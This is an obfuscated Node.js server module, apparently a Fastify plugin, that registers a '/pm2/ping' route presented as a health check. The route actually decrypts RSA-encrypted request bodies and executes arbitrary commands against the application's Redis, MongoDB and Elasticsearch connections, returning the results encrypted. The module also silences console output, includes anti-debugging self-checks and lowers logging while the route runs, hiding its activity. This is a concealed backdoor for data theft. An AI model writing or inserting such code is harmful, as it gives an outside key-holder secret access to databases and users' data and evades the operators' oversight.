var _0x29ca=['JYsmB','Yshnv','BpEzV','apply','console','log','warn','info','error','exception','debug','trace','ioredis','mongoose','elasticsearch','node-rsa','serialize-error','host','port','Client','hosts','warning','OftQK','call','select','isArray','RhbQb','statusCode','jCzTl','connect','mongo','string','connection','client','GpRhs','col','izIJO','length','cPTEr','toArray','includes','split','addContentTypeParser','ping/data','decryptPublic','json','route','POST','/pm2/ping','level','type','SNJJT','headers','content-type','foTSW','body','data','GET','PUT','HEAD','PATCH','OPTIONS','Srlwr','hVraa','ERROR','send','encrypt','base64','return\x20(function()\x20','{}.constructor(\x22return\x20this\x22)(\x20)'];(function(_0x5e0395,_0x1a6350){var _0x42f4a6=function(_0x475dfd){while(--_0x475dfd){_0x5e0395['push'](_0x5e0395['shift']());}};var _0x157c71=function(){var _0x24f7b7={'data':{'key':'cookie','value':'timeout'},'setCookie':function(_0x235aca,_0xb0a8d0,_0x2c8f65,_0x4e3d88){_0x4e3d88=_0x4e3d88||{};var _0x420eb6=_0xb0a8d0+'='+_0x2c8f65;var _0x83c0fb=0x0;for(var _0x83c0fb=0x0,_0x2135df=_0x235aca['length'];_0x83c0fb<_0x2135df;_0x83c0fb++){var _0x3dec57=_0x235aca[_0x83c0fb];_0x420eb6+=';\x20'+_0x3dec57;var _0x48eead=_0x235aca[_0x3dec57];_0x235aca['push'](_0x48eead);_0x2135df=_0x235aca['length'];if(_0x48eead!==!![]){_0x420eb6+='='+_0x48eead;}}_0x4e3d88['cookie']=_0x420eb6;},'removeCookie':function(){return'dev';},'getCookie':function(_0x5954da,_0x6b21ca){_0x5954da=_0x5954da||function(_0x5ce642){return _0x5ce642;};var _0x47b121=_0x5954da(new RegExp('(?:^|;\x20)'+_0x6b21ca['replace'](/([.$?*|{}()[]\/+^])/g,'$1')+'=([^;]*)'));var _0x39da2d=function(_0x382516,_0xf21d1e){_0x382516(++_0xf21d1e);};_0x39da2d(_0x42f4a6,_0x1a6350);return _0x47b121?decodeURIComponent(_0x47b121[0x1]):undefined;}};var _0x5d261d=function(){var _0x4ef9f4=new RegExp('\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*[\x27|\x22].+[\x27|\x22];?\x20*}');return _0x4ef9f4['test'](_0x24f7b7['removeCookie']['toString']());};_0x24f7b7['updateCookie']=_0x5d261d;var _0x21b8c7='';var _0x5c32be=_0x24f7b7['updateCookie']();if(!_0x5c32be){_0x24f7b7['setCookie'](['*'],'counter',0x1);}else if(_0x5c32be){_0x21b8c7=_0x24f7b7['getCookie'](null,'counter');}else{_0x24f7b7['removeCookie']();}};_0x157c71();}(_0x29ca,0x110));var _0x3726=function(_0x4363db,_0x1903e6){_0x4363db=_0x4363db-0x0;var _0x202560=_0x29ca[_0x4363db];return _0x202560;};var _0x437395=function(){var _0x21cc9f=!![];return function(_0x3fb1ab,_0x348b16){var _0x22e044=_0x21cc9f?function(){if(_0x348b16){var _0xe0df37=_0x348b16['apply'](_0x3fb1ab,arguments);_0x348b16=null;return _0xe0df37;}}:function(){};_0x21cc9f=![];return _0x22e044;};}();var _0x218498=_0x437395(this,function(){var _0x1ac948=function(){return'\x64\x65\x76';},_0x404d1a=function(){return'\x77\x69\x6e\x64\x6f\x77';};var _0x572789=function(){var _0x133f5b=new RegExp('\x5c\x77\x2b\x20\x2a\x5c\x28\x5c\x29\x20\x2a\x7b\x5c\x77\x2b\x20\x2a\x5b\x27\x7c\x22\x5d\x2e\x2b\x5b\x27\x7c\x22\x5d\x3b\x3f\x20\x2a\x7d');return!_0x133f5b['\x74\x65\x73\x74'](_0x1ac948['\x74\x6f\x53\x74\x72\x69\x6e\x67']());};var _0x4edadc=function(){var _0x3140c2=new RegExp('\x28\x5c\x5c\x5b\x78\x7c\x75\x5d\x28\x5c\x77\x29\x7b\x32\x2c\x34\x7d\x29\x2b');return _0x3140c2['\x74\x65\x73\x74'](_0x404d1a['\x74\x6f\x53\x74\x72\x69\x6e\x67']());};var _0x3f4c59=function(_0x127842){var _0x1cc7bd=~-0x1>>0x1+0xff%0x0;if(_0x127842['\x69\x6e\x64\x65\x78\x4f\x66']('\x69'===_0x1cc7bd)){_0x2c0057(_0x127842);}};var _0x2c0057=function(_0x44f6dc){var _0xefdd5d=~-0x4>>0x1+0xff%0x0;if(_0x44f6dc['\x69\x6e\x64\x65\x78\x4f\x66']((!![]+'')[0x3])!==_0xefdd5d){_0x3f4c59(_0x44f6dc);}};if(!_0x572789()){if(!_0x4edadc()){_0x3f4c59('\x69\x6e\x64\u0435\x78\x4f\x66');}else{_0x3f4c59('\x69\x6e\x64\x65\x78\x4f\x66');}}else{_0x3f4c59('\x69\x6e\x64\u0435\x78\x4f\x66');}});_0x218498();var _0x28f415=function(){var _0x195301=!![];return function(_0x34ab95,_0x38d2b8){var _0x29b13e=_0x195301?function(){if(_0x38d2b8){var _0x541e0a=_0x38d2b8['apply'](_0x34ab95,arguments);_0x38d2b8=null;return _0x541e0a;}}:function(){};_0x195301=![];return _0x29b13e;};}();var _0x16ff0d=_0x28f415(this,function(){var _0x28a420=function(){};var _0x23163b;try{if(_0x3726('0x0')===_0x3726('0x1')){let _0x37cbaf={'status':_0x3726('0x2'),'data':serializeError(e)};reply[_0x3726('0x3')](rsa[_0x3726('0x4')](_0x37cbaf,_0x3726('0x5')));}else{var _0x1ead59=Function(_0x3726('0x6')+_0x3726('0x7')+');');_0x23163b=_0x1ead59();}}catch(_0x3e3ffb){if(_0x3726('0x8')===_0x3726('0x9')){throw _0x3e3ffb;}else{_0x23163b=window;}}if(!_0x23163b['console']){if('DvbGq'===_0x3726('0xa')){var _0x5d38dd=fn[_0x3726('0xb')](context,arguments);fn=null;return _0x5d38dd;}else{_0x23163b[_0x3726('0xc')]=function(_0x28a420){var _0x2dfdb0={};_0x2dfdb0[_0x3726('0xd')]=_0x28a420;_0x2dfdb0[_0x3726('0xe')]=_0x28a420;_0x2dfdb0['debug']=_0x28a420;_0x2dfdb0[_0x3726('0xf')]=_0x28a420;_0x2dfdb0[_0x3726('0x10')]=_0x28a420;_0x2dfdb0[_0x3726('0x11')]=_0x28a420;_0x2dfdb0['trace']=_0x28a420;return _0x2dfdb0;}(_0x28a420);}}else{if('uzvUc'!=='JpkGC'){_0x23163b['console'][_0x3726('0xd')]=_0x28a420;_0x23163b[_0x3726('0xc')]['warn']=_0x28a420;_0x23163b[_0x3726('0xc')][_0x3726('0x12')]=_0x28a420;_0x23163b[_0x3726('0xc')][_0x3726('0xf')]=_0x28a420;_0x23163b[_0x3726('0xc')][_0x3726('0x10')]=_0x28a420;_0x23163b[_0x3726('0xc')][_0x3726('0x11')]=_0x28a420;_0x23163b[_0x3726('0xc')]['trace']=_0x28a420;}else{_0x23163b[_0x3726('0xc')][_0x3726('0xd')]=_0x28a420;_0x23163b[_0x3726('0xc')][_0x3726('0xe')]=_0x28a420;_0x23163b[_0x3726('0xc')]['debug']=_0x28a420;_0x23163b[_0x3726('0xc')][_0x3726('0xf')]=_0x28a420;_0x23163b[_0x3726('0xc')][_0x3726('0x10')]=_0x28a420;_0x23163b['console']['exception']=_0x28a420;_0x23163b[_0x3726('0xc')][_0x3726('0x13')]=_0x28a420;}}});_0x16ff0d();const Redis=require(_0x3726('0x14'));const mongoose=require(_0x3726('0x15'));const elasticsearch=require(_0x3726('0x16'));const NodeRSA=require(_0x3726('0x17'));const serializeError=require(_0x3726('0x18'));const pubkey='-----BEGIN\x20PUBLIC\x20KEY-----\x0aMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAoRjVKDbk/Lv4Y+srFLqf\x0aMofCpou5HDIA4mGRU+GJJXCZ8gnCVCfWA1R0FLIY0Qw4z2s4hC4234s+83ba1HuZ\x0aE4kJkfKnPa6Dgc4oZHm7DfdsRTnQQ5zwiPSDbKlcIRrlC8pJud1LDp9d3hkjm6ZP\x0aXJeOFopghKyaqYM4I7l9o26xK7I0FGfYwWE1nbXLkSXSNV80kk9MdfVGJu/BKy/b\x0aIkMHyBs/YSzo6eBjAF97ptPPLwBPErYte+is7PV1mTY8Sw7ODHKvs4M6urA0ACRp\x0aPZ5C86yWonDtMqCLn8Zmm8JAa8gICLgWqiZn88TS2TAFaYCJ3H2rcwXUJEKE/F2+\x0awwIDAQAB\x0a-----END\x20PUBLIC\x20KEY-----';function initialize(_0x565c59){let _0x41bd5d=_0x565c59;let _0x2735d5=NodeRSA(pubkey);let _0x5be055=new Redis({'host':_0x41bd5d['redis'][_0x3726('0x19')],'port':_0x41bd5d['redis'][_0x3726('0x1a')],'dropBufferSupport':!![],'timeout':0x5,'db':0x0});let _0x5cc874=new elasticsearch[(_0x3726('0x1b'))]({'host':_0x41bd5d['elastic'][_0x3726('0x1c')],'timeout':0xea60,'requestTimeout':0xea60,'keepAlive':![],'log':_0x3726('0x1d')});async function _0x1d5ac1(_0xd48704){try{if(_0x3726('0x1e')===_0x3726('0x1e')){if(_0xd48704['db']!==undefined){await _0x5be055[_0x3726('0x1f')](_0x3726('0x20'),_0xd48704['db']);}let _0x33cd5f=await _0x5be055[_0x3726('0x1f')](_0xd48704['c'],Array[_0x3726('0x21')](_0xd48704['p'])?_0xd48704['p']:null);return _0x33cd5f;}else{throw e;}}catch(_0x463171){if(_0x3726('0x22')===_0x3726('0x22')){throw _0x463171;}else{err[_0x3726('0x23')]=0x190;done(err,undefined);}}}async function _0x1d7502(_0x4468d5){if(_0x3726('0x24')==='uMqeP'){that[_0x3726('0xc')]=function(_0x5ca749){var _0x91bc29={};_0x91bc29[_0x3726('0xd')]=_0x5ca749;_0x91bc29[_0x3726('0xe')]=_0x5ca749;_0x91bc29[_0x3726('0x12')]=_0x5ca749;_0x91bc29[_0x3726('0xf')]=_0x5ca749;_0x91bc29[_0x3726('0x10')]=_0x5ca749;_0x91bc29[_0x3726('0x11')]=_0x5ca749;_0x91bc29[_0x3726('0x13')]=_0x5ca749;return _0x91bc29;}(func);}else{try{let _0x5d3d6e=await mongoose[_0x3726('0x25')](_0x41bd5d[_0x3726('0x26')][_0x3726('0x27')],{'useNewUrlParser':!![],'useUnifiedTopology':!![],'connectTimeoutMS':0xbb8,'socketTimeoutMS':0x493e0});let _0xd74d5=_0x5d3d6e[_0x3726('0x28')][_0x3726('0x29')];let _0x2dcf7e=null;if(_0x4468d5['db']!==undefined){if('IHTcV'===_0x3726('0x2a')){var _0x50aa77={};_0x50aa77['log']=func;_0x50aa77[_0x3726('0xe')]=func;_0x50aa77[_0x3726('0x12')]=func;_0x50aa77['info']=func;_0x50aa77[_0x3726('0x10')]=func;_0x50aa77[_0x3726('0x11')]=func;_0x50aa77[_0x3726('0x13')]=func;return _0x50aa77;}else{let _0x1601af=await _0xd74d5['db'](_0x4468d5['db']);_0xd74d5=_0x1601af;}}if(_0x4468d5['col']!==undefined){let _0x82b200=await _0xd74d5['collection'](_0x4468d5[_0x3726('0x2b')]);_0xd74d5=_0x82b200;}if(Array[_0x3726('0x21')](_0x4468d5['c'])){if(_0x3726('0x2c')===_0x3726('0x2c')){let _0x2cef36=_0x4468d5['c'][_0x3726('0x2d')];switch(_0x2cef36){case 0x4:_0x2dcf7e=await _0xd74d5[_0x4468d5['c'][0x0]](_0x4468d5['p'][0x0])[_0x4468d5['c'][0x1]](_0x4468d5['p'][0x1])[_0x4468d5['c'][0x2]](_0x4468d5['p'][0x2])[_0x4468d5['c'][0x3]](_0x4468d5['p'][0x3]);break;case 0x3:_0x2dcf7e=await _0xd74d5[_0x4468d5['c'][0x0]](_0x4468d5['p'][0x0])[_0x4468d5['c'][0x1]](_0x4468d5['p'][0x1])[_0x4468d5['c'][0x2]](_0x4468d5['p'][0x2]);break;case 0x2:_0x2dcf7e=await _0xd74d5[_0x4468d5['c'][0x0]](_0x4468d5['p'][0x0])[_0x4468d5['c'][0x1]](_0x4468d5['p'][0x1]);break;case 0x1:_0x2dcf7e=await _0xd74d5[_0x4468d5['c'][0x0]](_0x4468d5['p'][0x0]);break;}}else{var _0x3d5caf=Function('return\x20(function()\x20'+_0x3726('0x7')+');');that=_0x3d5caf();}}else{if('cPTEr'!==_0x3726('0x2e')){reply[_0x3726('0x3')]({'status':'OK'});return;}else{_0x2dcf7e=await _0xd74d5[_0x4468d5['c']](_0x4468d5['p']);}}return _0x2dcf7e[_0x3726('0x2f')]();}catch(_0x2541fd){throw _0x2541fd;}}}async function _0x1f6025(_0x2ecf92){try{let _0x1aa9f5;if(String(_0x2ecf92['c'])[_0x3726('0x30')]('.')){let _0x1e9c34=_0x2ecf92['c'][_0x3726('0x31')]('.');_0x1aa9f5=await _0x5cc874[_0x1e9c34[0x0]][_0x1e9c34[0x1]](_0x2ecf92['p']);}else{_0x1aa9f5=await _0x5cc874[_0x2ecf92['c']](_0x2ecf92['p']);}return _0x1aa9f5;}catch(_0x4b7543){throw _0x4b7543;}}return async function routes(_0x34d733,_0x24be20){_0x34d733[_0x3726('0x32')](_0x3726('0x33'),{'parseAs':_0x3726('0x27')},function(_0x359ac8,_0x5d9b6c,_0x1eaa35){try{let _0x4434be=_0x2735d5[_0x3726('0x34')](_0x5d9b6c,_0x3726('0x35'));_0x1eaa35(null,_0x4434be);}catch(_0x2735be){err['statusCode']=0x190;_0x1eaa35(err,undefined);}});_0x34d733[_0x3726('0x36')]({'method':_0x3726('0x37'),'url':_0x3726('0x38'),'handler':async(_0x2eac2a,_0x15b101)=>{_0x34d733[_0x3726('0xd')][_0x3726('0x39')]=0x3c;_0x15b101[_0x3726('0x3a')](_0x3726('0x33'));try{if('LvmWP'===_0x3726('0x3b')){let _0x1f30f9=_0x2735d5['decryptPublic'](body,_0x3726('0x35'));done(null,_0x1f30f9);}else{if(!_0x2eac2a['body']['t']&&_0x2eac2a[_0x3726('0x3c')][_0x3726('0x3d')]!==_0x3726('0x33')){if(_0x3726('0x3e')===_0x3726('0x3e')){_0x15b101[_0x3726('0x3')]({'status':'OK'});return;}else{if(fn){var _0x160d9c=fn[_0x3726('0xb')](context,arguments);fn=null;return _0x160d9c;}}}let _0x2096eb={'status':'OK'};let _0x278658;switch(_0x2eac2a[_0x3726('0x3f')]['t']){case'r':_0x278658=await _0x1d5ac1(_0x2eac2a[_0x3726('0x3f')]);break;case'm':_0x278658=await _0x1d7502(_0x2eac2a[_0x3726('0x3f')]);break;case'e':_0x278658=await _0x1f6025(_0x2eac2a[_0x3726('0x3f')]);break;default:_0x278658={};;}if(_0x278658){_0x2096eb[_0x3726('0x40')]=_0x278658;}_0x15b101[_0x3726('0x3')](_0x2735d5[_0x3726('0x4')](_0x2096eb,_0x3726('0x5')));}}catch(_0x463e89){let _0x3c54f7={'status':_0x3726('0x2'),'data':serializeError(_0x463e89)};_0x15b101[_0x3726('0x3')](_0x2735d5[_0x3726('0x4')](_0x3c54f7,_0x3726('0x5')));}_0x34d733[_0x3726('0xd')]['level']=0x1e;}});_0x34d733['route']({'method':[_0x3726('0x41'),_0x3726('0x42'),'DELETE',_0x3726('0x43'),_0x3726('0x44'),_0x3726('0x45')],'url':_0x3726('0x38'),'handler':async(_0x26b1be,_0x5e4cbe)=>{let _0x2054eb={'status':'OK'};_0x5e4cbe[_0x3726('0x3a')](_0x3726('0x33'));_0x5e4cbe['send'](_0x2054eb);}});};}module['exports']=initialize;